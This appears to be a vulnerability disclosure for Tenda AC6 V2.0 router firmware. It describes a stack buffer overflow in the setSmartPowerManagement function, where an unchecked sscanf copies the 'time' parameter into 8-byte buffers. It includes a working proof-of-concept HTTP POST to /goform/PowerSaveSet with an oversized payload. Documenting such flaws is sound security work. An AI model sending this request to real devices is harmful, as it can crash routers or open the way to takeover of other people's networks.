# Tenda AC6V2.0_V15.03.06.23_multi firmware is vulnerable to Buffer Overflow via function "setSmartPowerManagement"

Firmware download website:

[AC6V2.0升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/material/show/2855)

In the `setSmartPowerManagement` function, a user can craft a POST request to provide the **`time` parameter**. This `time` parameter is then processed by `sscanf(time, "%[^:]:%[^-]-%[^:]:%s", hour_start, min_start, hour_end, min_end);`, which writes the extracted data directly to the stack-allocated variables `hour_start`, `min_start`, `hour_end`, and `min_end`. Since each of these variables has a small size of **8 bytes**, it's very easy to trigger a **stack overflow**.

![image-20250619024343211](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250619024343211.png)

poc

```
POST /goform/PowerSaveSet HTTP/1.1
Host: 192.168.1.1
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: password=xzbtgb
Connection: close
Content-Length: 493

time=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

![image-20250619024753760](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250619024753760.png)